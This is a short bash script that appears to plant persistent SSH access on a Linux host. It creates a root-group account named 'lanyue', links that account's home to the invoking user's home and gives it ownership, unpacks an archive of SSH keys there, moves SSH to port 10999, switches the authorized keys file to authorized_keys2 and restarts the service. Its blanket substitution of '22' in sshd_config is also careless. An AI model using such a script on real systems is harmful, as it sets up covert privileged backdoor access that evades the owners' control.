#!/bin/bash
useradd -g 0 -d /home/lanyue -s /bin/bash lanyue
sed -i 's\22\10999\g' /etc/ssh/sshd_config
rm -rf /home/lanyue
ln -s ~/ /home/lanyue
chown lanyue ~/
mv sshpub.tar ~/
cd ~/
tar xvf sshpub.tar
sleep 5
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config 
sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile/' /etc/ssh/sshd_config 
sed -i 's/authorized_keys/authorized_keys2/' /etc/ssh/sshd_config 
sleep 5
grep PasswordAuthentication /etc/ssh/sshd_config
grep authorized_keys /etc/ssh/sshd_config 
sleep 2
/etc/init.d/ssh restart
